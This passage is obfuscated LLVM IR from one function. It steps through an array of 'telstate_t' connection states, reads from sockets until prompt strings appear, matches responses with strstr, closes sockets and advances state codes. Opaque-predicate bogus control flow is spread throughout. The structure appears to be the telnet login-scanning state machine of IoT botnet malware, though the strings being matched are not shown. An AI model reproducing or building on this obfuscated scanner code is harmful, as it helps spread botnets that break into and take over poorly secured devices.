  %2194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2193
  %2195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2194, i32 0, i32 6
  store i32 0, i32* %2195, align 4
  %2196 = load i32, i32* %2, align 4
  %2197 = sext i32 %2196 to i64
  %2198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2197
  %2199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2198, i32 0, i32 7
  store i16 0, i16* %2199, align 16
  %2200 = load i32, i32* %2, align 4
  %2201 = sext i32 %2200 to i64
  %2202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2201
  %2203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2202, i32 0, i32 8
  %2204 = load i8*, i8** %2203, align 8
  %2205 = call i8* @strstr(i8* %2204, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %2206 = icmp ne i8* %2205, null
  br i1 %2206, label %2207, label %2243

; <label>:2207:                                   ; preds = %2191
  %2208 = load i32, i32* @x.69
  %2209 = load i32, i32* @y.70
  %2210 = sub i32 %2208, 1
  %2211 = mul i32 %2208, %2210
  %2212 = urem i32 %2211, 2
  %2213 = icmp eq i32 %2212, 0
  %2214 = icmp slt i32 %2209, 10
  %2215 = or i1 %2213, %2214
  br i1 %2215, label %originalBB235, label %originalBB235alteredBB

originalBB235:                                    ; preds = %originalBB235alteredBB, %2207
  %2216 = load i32, i32* %2, align 4
  %2217 = sext i32 %2216 to i64
  %2218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2217
  %2219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2218, i32 0, i32 8
  %2220 = load i8*, i8** %2219, align 8
  call void @llvm.memset.p0i8.i64(i8* %2220, i8 0, i64 1024, i32 1, i1 false)
  %2221 = load i32, i32* %2, align 4
  %2222 = sext i32 %2221 to i64
  %2223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2222
  %2224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2223, i32 0, i32 0
  %2225 = load i32, i32* %2224, align 16
  %2226 = call i32 @sclose(i32 %2225)
  %2227 = load i32, i32* %2, align 4
  %2228 = sext i32 %2227 to i64
  %2229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2228
  %2230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2229, i32 0, i32 2
  store i8 0, i8* %2230, align 8
  %2231 = load i32, i32* %2, align 4
  %2232 = sext i32 %2231 to i64
  %2233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2232
  %2234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2233, i32 0, i32 3
  store i8 0, i8* %2234, align 1
  %2235 = load i32, i32* @x.69
  %2236 = load i32, i32* @y.70
  %2237 = sub i32 %2235, 1
  %2238 = mul i32 %2235, %2237
  %2239 = urem i32 %2238, 2
  %2240 = icmp eq i32 %2239, 0
  %2241 = icmp slt i32 %2236, 10
  %2242 = or i1 %2240, %2241
  br i1 %2242, label %originalBBpart2237, label %originalBB235alteredBB

originalBBpart2237:                               ; preds = %originalBB235
  br label %3224

; <label>:2243:                                   ; preds = %2191
  %2244 = load i32, i32* %2, align 4
  %2245 = sext i32 %2244 to i64
  %2246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2245
  %2247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2246, i32 0, i32 2
  store i8 7, i8* %2247, align 8
  br label %2248

; <label>:2248:                                   ; preds = %2243
  %2249 = load i32, i32* @x.69
  %2250 = load i32, i32* @y.70
  %2251 = sub i32 %2249, 1
  %2252 = mul i32 %2249, %2251
  %2253 = urem i32 %2252, 2
  %2254 = icmp eq i32 %2253, 0
  %2255 = icmp slt i32 %2250, 10
  %2256 = or i1 %2254, %2255
  br i1 %2256, label %originalBB239, label %originalBB239alteredBB

originalBB239:                                    ; preds = %originalBB239alteredBB, %2248
  %2257 = load i32, i32* %2, align 4
  %2258 = sext i32 %2257 to i64
  %2259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2258
  %2260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2259, i32 0, i32 8
  %2261 = load i8*, i8** %2260, align 8
  call void @llvm.memset.p0i8.i64(i8* %2261, i8 0, i64 1024, i32 1, i1 false)
  %2262 = load i32, i32* @x.69
  %2263 = load i32, i32* @y.70
  %2264 = sub i32 %2262, 1
  %2265 = mul i32 %2262, %2264
  %2266 = urem i32 %2265, 2
  %2267 = icmp eq i32 %2266, 0
  %2268 = icmp slt i32 %2263, 10
  %2269 = or i1 %2267, %2268
  br i1 %2269, label %originalBBpart2241, label %originalBB239alteredBB

originalBBpart2241:                               ; preds = %originalBB239
  br label %3224

; <label>:2270:                                   ; preds = %2172
  %2271 = load i32, i32* %2, align 4
  %2272 = sext i32 %2271 to i64
  %2273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2272
  %2274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2273, i32 0, i32 0
  %2275 = load i32, i32* %2274, align 16
  %2276 = load i32, i32* %2, align 4
  %2277 = sext i32 %2276 to i64
  %2278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2277
  %2279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2278, i32 0, i32 8
  %2280 = load i8*, i8** %2279, align 8
  %2281 = load i32, i32* %2, align 4
  %2282 = sext i32 %2281 to i64
  %2283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2282
  %2284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2283, i32 0, i32 7
  %2285 = load i16, i16* %2284, align 16
  %2286 = zext i16 %2285 to i32
  %2287 = call i32 @readUntil(i32 %2275, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2280, i32 1024, i32 %2286)
  %2288 = icmp ne i32 %2287, 0
  br i1 %2288, label %2289, label %2336

; <label>:2289:                                   ; preds = %2270
  %2290 = load i32, i32* %2, align 4
  %2291 = sext i32 %2290 to i64
  %2292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2291
  %2293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2292, i32 0, i32 6
  store i32 0, i32* %2293, align 4
  %2294 = load i32, i32* %2, align 4
  %2295 = sext i32 %2294 to i64
  %2296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2295
  %2297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2296, i32 0, i32 7
  store i16 0, i16* %2297, align 16
  %2298 = load i32, i32* %2, align 4
  %2299 = sext i32 %2298 to i64
  %2300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2299
  %2301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2300, i32 0, i32 8
  %2302 = load i8*, i8** %2301, align 8
  %2303 = call i8* @strstr(i8* %2302, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %2304 = icmp ne i8* %2303, null
  br i1 %2304, label %2305, label %2325

; <label>:2305:                                   ; preds = %2289
  %2306 = load i32, i32* %2, align 4
  %2307 = sext i32 %2306 to i64
  %2308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2307
  %2309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2308, i32 0, i32 8
  %2310 = load i8*, i8** %2309, align 8
  call void @llvm.memset.p0i8.i64(i8* %2310, i8 0, i64 1024, i32 1, i1 false)
  %2311 = load i32, i32* %2, align 4
  %2312 = sext i32 %2311 to i64
  %2313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2312
  %2314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2313, i32 0, i32 0
  %2315 = load i32, i32* %2314, align 16
  %2316 = call i32 @sclose(i32 %2315)
  %2317 = load i32, i32* %2, align 4
  %2318 = sext i32 %2317 to i64
  %2319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2318
  %2320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2319, i32 0, i32 2
  store i8 0, i8* %2320, align 8
  %2321 = load i32, i32* %2, align 4
  %2322 = sext i32 %2321 to i64
  %2323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2322
  %2324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2323, i32 0, i32 3
  store i8 0, i8* %2324, align 1
  br label %3224

; <label>:2325:                                   ; preds = %2289
  %2326 = load i32, i32* %2, align 4
  %2327 = sext i32 %2326 to i64
  %2328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2327
  %2329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2328, i32 0, i32 2
  store i8 7, i8* %2329, align 8
  br label %2330

; <label>:2330:                                   ; preds = %2325
  %2331 = load i32, i32* %2, align 4
  %2332 = sext i32 %2331 to i64
  %2333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2332
  %2334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2333, i32 0, i32 8
  %2335 = load i8*, i8** %2334, align 8
  call void @llvm.memset.p0i8.i64(i8* %2335, i8 0, i64 1024, i32 1, i1 false)
  br label %3224

; <label>:2336:                                   ; preds = %2270
  %2337 = load i32, i32* @x.69
  %2338 = load i32, i32* @y.70
  %2339 = sub i32 %2337, 1
  %2340 = mul i32 %2337, %2339
  %2341 = urem i32 %2340, 2
  %2342 = icmp eq i32 %2341, 0
  %2343 = icmp slt i32 %2338, 10
  %2344 = or i1 %2342, %2343
  br i1 %2344, label %originalBB243, label %originalBB243alteredBB

originalBB243:                                    ; preds = %originalBB243alteredBB, %2336
  %2345 = load i32, i32* %2, align 4
  %2346 = sext i32 %2345 to i64
  %2347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2346
  %2348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2347, i32 0, i32 0
  %2349 = load i32, i32* %2348, align 16
  %2350 = load i32, i32* %2, align 4
  %2351 = sext i32 %2350 to i64
  %2352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2351
  %2353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2352, i32 0, i32 8
  %2354 = load i8*, i8** %2353, align 8
  %2355 = load i32, i32* %2, align 4
  %2356 = sext i32 %2355 to i64
  %2357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2356
  %2358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2357, i32 0, i32 7
  %2359 = load i16, i16* %2358, align 16
  %2360 = zext i16 %2359 to i32
  %2361 = call i32 @readUntil(i32 %2349, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2354, i32 1024, i32 %2360)
  %2362 = icmp ne i32 %2361, 0
  %2363 = load i32, i32* @x.69
  %2364 = load i32, i32* @y.70
  %2365 = sub i32 %2363, 1
  %2366 = mul i32 %2363, %2365
  %2367 = urem i32 %2366, 2
  %2368 = icmp eq i32 %2367, 0
  %2369 = icmp slt i32 %2364, 10
  %2370 = or i1 %2368, %2369
  br i1 %2370, label %originalBBpart2245, label %originalBB243alteredBB

originalBBpart2245:                               ; preds = %originalBB243
  br i1 %2362, label %2371, label %2466

; <label>:2371:                                   ; preds = %originalBBpart2245
  %2372 = load i32, i32* @x.69
  %2373 = load i32, i32* @y.70
  %2374 = sub i32 %2372, 1
  %2375 = mul i32 %2372, %2374
  %2376 = urem i32 %2375, 2
  %2377 = icmp eq i32 %2376, 0
  %2378 = icmp slt i32 %2373, 10
  %2379 = or i1 %2377, %2378
  br i1 %2379, label %originalBB247, label %originalBB247alteredBB

originalBB247:                                    ; preds = %originalBB247alteredBB, %2371
  %2380 = load i32, i32* %2, align 4
  %2381 = sext i32 %2380 to i64
  %2382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2381
  %2383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2382, i32 0, i32 6
  store i32 0, i32* %2383, align 4
  %2384 = load i32, i32* %2, align 4
  %2385 = sext i32 %2384 to i64
  %2386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2385
  %2387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2386, i32 0, i32 7
  store i16 0, i16* %2387, align 16
  %2388 = load i32, i32* %2, align 4
  %2389 = sext i32 %2388 to i64
  %2390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2389
  %2391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2390, i32 0, i32 8
  %2392 = load i8*, i8** %2391, align 8
  %2393 = call i8* @strstr(i8* %2392, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %2394 = icmp ne i8* %2393, null
  %2395 = load i32, i32* @x.69
  %2396 = load i32, i32* @y.70
  %2397 = sub i32 %2395, 1
  %2398 = mul i32 %2395, %2397
  %2399 = urem i32 %2398, 2
  %2400 = icmp eq i32 %2399, 0
  %2401 = icmp slt i32 %2396, 10
  %2402 = or i1 %2400, %2401
  br i1 %2402, label %originalBBpart2249, label %originalBB247alteredBB

originalBBpart2249:                               ; preds = %originalBB247
  br i1 %2394, label %2403, label %2439

; <label>:2403:                                   ; preds = %originalBBpart2249
  %2404 = load i32, i32* @x.69
  %2405 = load i32, i32* @y.70
  %2406 = sub i32 %2404, 1
  %2407 = mul i32 %2404, %2406
  %2408 = urem i32 %2407, 2
  %2409 = icmp eq i32 %2408, 0
  %2410 = icmp slt i32 %2405, 10
  %2411 = or i1 %2409, %2410
  br i1 %2411, label %originalBB251, label %originalBB251alteredBB

originalBB251:                                    ; preds = %originalBB251alteredBB, %2403
  %2412 = load i32, i32* %2, align 4
  %2413 = sext i32 %2412 to i64
  %2414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2413
  %2415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2414, i32 0, i32 8
  %2416 = load i8*, i8** %2415, align 8
  call void @llvm.memset.p0i8.i64(i8* %2416, i8 0, i64 1024, i32 1, i1 false)
  %2417 = load i32, i32* %2, align 4
  %2418 = sext i32 %2417 to i64
  %2419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2418
  %2420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2419, i32 0, i32 0
  %2421 = load i32, i32* %2420, align 16
  %2422 = call i32 @sclose(i32 %2421)
  %2423 = load i32, i32* %2, align 4
  %2424 = sext i32 %2423 to i64
  %2425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2424
  %2426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2425, i32 0, i32 2
  store i8 0, i8* %2426, align 8
  %2427 = load i32, i32* %2, align 4
  %2428 = sext i32 %2427 to i64
  %2429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2428
  %2430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2429, i32 0, i32 3
  store i8 0, i8* %2430, align 1
  %2431 = load i32, i32* @x.69
  %2432 = load i32, i32* @y.70
  %2433 = sub i32 %2431, 1
  %2434 = mul i32 %2431, %2433
  %2435 = urem i32 %2434, 2
  %2436 = icmp eq i32 %2435, 0
  %2437 = icmp slt i32 %2432, 10
  %2438 = or i1 %2436, %2437
  br i1 %2438, label %originalBBpart2253, label %originalBB251alteredBB

originalBBpart2253:                               ; preds = %originalBB251
  br label %3224

; <label>:2439:                                   ; preds = %originalBBpart2249
  %2440 = load i32, i32* %2, align 4
  %2441 = sext i32 %2440 to i64
  %2442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2441
  %2443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2442, i32 0, i32 2
  store i8 7, i8* %2443, align 8
  br label %2444

; <label>:2444:                                   ; preds = %2439
  %2445 = load i32, i32* @x.69
  %2446 = load i32, i32* @y.70
  %2447 = sub i32 %2445, 1
  %2448 = mul i32 %2445, %2447
  %2449 = urem i32 %2448, 2
  %2450 = icmp eq i32 %2449, 0
  %2451 = icmp slt i32 %2446, 10
  %2452 = or i1 %2450, %2451
  br i1 %2452, label %originalBB255, label %originalBB255alteredBB

originalBB255:                                    ; preds = %originalBB255alteredBB, %2444
  %2453 = load i32, i32* %2, align 4
  %2454 = sext i32 %2453 to i64
  %2455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2454
  %2456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2455, i32 0, i32 8
  %2457 = load i8*, i8** %2456, align 8
  call void @llvm.memset.p0i8.i64(i8* %2457, i8 0, i64 1024, i32 1, i1 false)
  %2458 = load i32, i32* @x.69
  %2459 = load i32, i32* @y.70
  %2460 = sub i32 %2458, 1
  %2461 = mul i32 %2458, %2460
  %2462 = urem i32 %2461, 2
  %2463 = icmp eq i32 %2462, 0
  %2464 = icmp slt i32 %2459, 10
  %2465 = or i1 %2463, %2464
  br i1 %2465, label %originalBBpart2257, label %originalBB255alteredBB

originalBBpart2257:                               ; preds = %originalBB255
  br label %3224

; <label>:2466:                                   ; preds = %originalBBpart2245
  %2467 = load i32, i32* %2, align 4
  %2468 = sext i32 %2467 to i64
  %2469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2468
  %2470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2469, i32 0, i32 0
  %2471 = load i32, i32* %2470, align 16
  %2472 = load i32, i32* %2, align 4
  %2473 = sext i32 %2472 to i64
  %2474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2473
  %2475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2474, i32 0, i32 8
  %2476 = load i8*, i8** %2475, align 8
  %2477 = load i32, i32* %2, align 4
  %2478 = sext i32 %2477 to i64
  %2479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2478
  %2480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2479, i32 0, i32 7
  %2481 = load i16, i16* %2480, align 16
  %2482 = zext i16 %2481 to i32
  %2483 = call i32 @readUntil(i32 %2471, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2476, i32 1024, i32 %2482)
  %2484 = icmp ne i32 %2483, 0
  br i1 %2484, label %2485, label %2548

; <label>:2485:                                   ; preds = %2466
  %2486 = load i32, i32* %2, align 4
  %2487 = sext i32 %2486 to i64
  %2488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2487
  %2489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2488, i32 0, i32 6
  store i32 0, i32* %2489, align 4
  %2490 = load i32, i32* %2, align 4
  %2491 = sext i32 %2490 to i64
  %2492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2491
  %2493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2492, i32 0, i32 7
  store i16 0, i16* %2493, align 16
  %2494 = load i32, i32* %2, align 4
  %2495 = sext i32 %2494 to i64
  %2496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2495
  %2497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2496, i32 0, i32 8
  %2498 = load i8*, i8** %2497, align 8
  %2499 = call i8* @strstr(i8* %2498, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %2500 = icmp ne i8* %2499, null
  br i1 %2500, label %2501, label %2521

; <label>:2501:                                   ; preds = %2485
  %2502 = load i32, i32* %2, align 4
  %2503 = sext i32 %2502 to i64
  %2504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2503
  %2505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2504, i32 0, i32 8
  %2506 = load i8*, i8** %2505, align 8
  call void @llvm.memset.p0i8.i64(i8* %2506, i8 0, i64 1024, i32 1, i1 false)
  %2507 = load i32, i32* %2, align 4
  %2508 = sext i32 %2507 to i64
  %2509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2508
  %2510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2509, i32 0, i32 0
  %2511 = load i32, i32* %2510, align 16
  %2512 = call i32 @sclose(i32 %2511)
  %2513 = load i32, i32* %2, align 4
  %2514 = sext i32 %2513 to i64
  %2515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2514
  %2516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2515, i32 0, i32 2
  store i8 0, i8* %2516, align 8
  %2517 = load i32, i32* %2, align 4
  %2518 = sext i32 %2517 to i64
  %2519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2518
  %2520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2519, i32 0, i32 3
  store i8 0, i8* %2520, align 1
  br label %3224

; <label>:2521:                                   ; preds = %2485
  %2522 = load i32, i32* @x.69
  %2523 = load i32, i32* @y.70
  %2524 = sub i32 %2522, 1
  %2525 = mul i32 %2522, %2524
  %2526 = urem i32 %2525, 2
  %2527 = icmp eq i32 %2526, 0
  %2528 = icmp slt i32 %2523, 10
  %2529 = or i1 %2527, %2528
  br i1 %2529, label %originalBB259, label %originalBB259alteredBB

originalBB259:                                    ; preds = %originalBB259alteredBB, %2521
  %2530 = load i32, i32* %2, align 4
  %2531 = sext i32 %2530 to i64
  %2532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2531
  %2533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2532, i32 0, i32 2
  store i8 7, i8* %2533, align 8
  %2534 = load i32, i32* @x.69
  %2535 = load i32, i32* @y.70
  %2536 = sub i32 %2534, 1
  %2537 = mul i32 %2534, %2536
  %2538 = urem i32 %2537, 2
  %2539 = icmp eq i32 %2538, 0
  %2540 = icmp slt i32 %2535, 10
  %2541 = or i1 %2539, %2540
  br i1 %2541, label %originalBBpart2261, label %originalBB259alteredBB

originalBBpart2261:                               ; preds = %originalBB259
  br label %2542

; <label>:2542:                                   ; preds = %originalBBpart2261
  %2543 = load i32, i32* %2, align 4
  %2544 = sext i32 %2543 to i64
  %2545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2544
  %2546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2545, i32 0, i32 8
  %2547 = load i8*, i8** %2546, align 8
  call void @llvm.memset.p0i8.i64(i8* %2547, i8 0, i64 1024, i32 1, i1 false)
  br label %3224

; <label>:2548:                                   ; preds = %2466
  %2549 = load i32, i32* @x.69
  %2550 = load i32, i32* @y.70
  %2551 = sub i32 %2549, 1
  %2552 = mul i32 %2549, %2551
  %2553 = urem i32 %2552, 2
  %2554 = icmp eq i32 %2553, 0
  %2555 = icmp slt i32 %2550, 10
  %2556 = or i1 %2554, %2555
  br i1 %2556, label %originalBB263, label %originalBB263alteredBB

originalBB263:                                    ; preds = %originalBB263alteredBB, %2548
  %2557 = load i32, i32* %2, align 4
  %2558 = sext i32 %2557 to i64
  %2559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2558
  %2560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2559, i32 0, i32 0
  %2561 = load i32, i32* %2560, align 16
  %2562 = load i32, i32* %2, align 4
  %2563 = sext i32 %2562 to i64
  %2564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2563
  %2565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2564, i32 0, i32 8
  %2566 = load i8*, i8** %2565, align 8
  %2567 = load i32, i32* %2, align 4
  %2568 = sext i32 %2567 to i64
  %2569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2568
  %2570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2569, i32 0, i32 7
  %2571 = load i16, i16* %2570, align 16
  %2572 = zext i16 %2571 to i32
  %2573 = call i32 @readUntil(i32 %2561, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2566, i32 1024, i32 %2572)
  %2574 = icmp ne i32 %2573, 0
  %2575 = load i32, i32* @x.69
  %2576 = load i32, i32* @y.70
  %2577 = sub i32 %2575, 1
  %2578 = mul i32 %2575, %2577
  %2579 = urem i32 %2578, 2
  %2580 = icmp eq i32 %2579, 0
  %2581 = icmp slt i32 %2576, 10
  %2582 = or i1 %2580, %2581
  br i1 %2582, label %originalBBpart2265, label %originalBB263alteredBB

originalBBpart2265:                               ; preds = %originalBB263
  br i1 %2574, label %2583, label %2630

; <label>:2583:                                   ; preds = %originalBBpart2265
  %2584 = load i32, i32* %2, align 4
  %2585 = sext i32 %2584 to i64
  %2586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2585
  %2587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2586, i32 0, i32 6
  store i32 0, i32* %2587, align 4
  %2588 = load i32, i32* %2, align 4
  %2589 = sext i32 %2588 to i64
  %2590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2589
  %2591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2590, i32 0, i32 7
  store i16 0, i16* %2591, align 16
  %2592 = load i32, i32* %2, align 4
  %2593 = sext i32 %2592 to i64
  %2594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2593
  %2595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2594, i32 0, i32 8
  %2596 = load i8*, i8** %2595, align 8
  %2597 = call i8* @strstr(i8* %2596, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %2598 = icmp ne i8* %2597, null
  br i1 %2598, label %2599, label %2619

; <label>:2599:                                   ; preds = %2583
  %2600 = load i32, i32* %2, align 4
  %2601 = sext i32 %2600 to i64
  %2602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2601
  %2603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2602, i32 0, i32 8
  %2604 = load i8*, i8** %2603, align 8
  call void @llvm.memset.p0i8.i64(i8* %2604, i8 0, i64 1024, i32 1, i1 false)
  %2605 = load i32, i32* %2, align 4
  %2606 = sext i32 %2605 to i64
  %2607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2606
  %2608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2607, i32 0, i32 0
  %2609 = load i32, i32* %2608, align 16
  %2610 = call i32 @sclose(i32 %2609)
  %2611 = load i32, i32* %2, align 4
  %2612 = sext i32 %2611 to i64
  %2613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2612
  %2614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2613, i32 0, i32 2
  store i8 0, i8* %2614, align 8
  %2615 = load i32, i32* %2, align 4
  %2616 = sext i32 %2615 to i64
  %2617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2616
  %2618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2617, i32 0, i32 3
  store i8 0, i8* %2618, align 1
  br label %3224

; <label>:2619:                                   ; preds = %2583
  %2620 = load i32, i32* %2, align 4
  %2621 = sext i32 %2620 to i64
  %2622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2621
  %2623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2622, i32 0, i32 2
  store i8 7, i8* %2623, align 8
  br label %2624

; <label>:2624:                                   ; preds = %2619
  %2625 = load i32, i32* %2, align 4
  %2626 = sext i32 %2625 to i64
  %2627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2626
  %2628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2627, i32 0, i32 8
  %2629 = load i8*, i8** %2628, align 8
  call void @llvm.memset.p0i8.i64(i8* %2629, i8 0, i64 1024, i32 1, i1 false)
  br label %3224

; <label>:2630:                                   ; preds = %originalBBpart2265
  %2631 = load i32, i32* @x.69
  %2632 = load i32, i32* @y.70
  %2633 = sub i32 %2631, 1
  %2634 = mul i32 %2631, %2633
  %2635 = urem i32 %2634, 2
  %2636 = icmp eq i32 %2635, 0
  %2637 = icmp slt i32 %2632, 10
  %2638 = or i1 %2636, %2637
  br i1 %2638, label %originalBB267, label %originalBB267alteredBB

originalBB267:                                    ; preds = %originalBB267alteredBB, %2630
  %2639 = load i32, i32* %2, align 4
  %2640 = sext i32 %2639 to i64
  %2641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2640
  %2642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2641, i32 0, i32 8
  %2643 = load i8*, i8** %2642, align 8
  %2644 = call i64 @strlen(i8* %2643) #10
  %2645 = trunc i64 %2644 to i16
  %2646 = load i32, i32* %2, align 4
  %2647 = sext i32 %2646 to i64
  %2648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2647
  %2649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2648, i32 0, i32 7
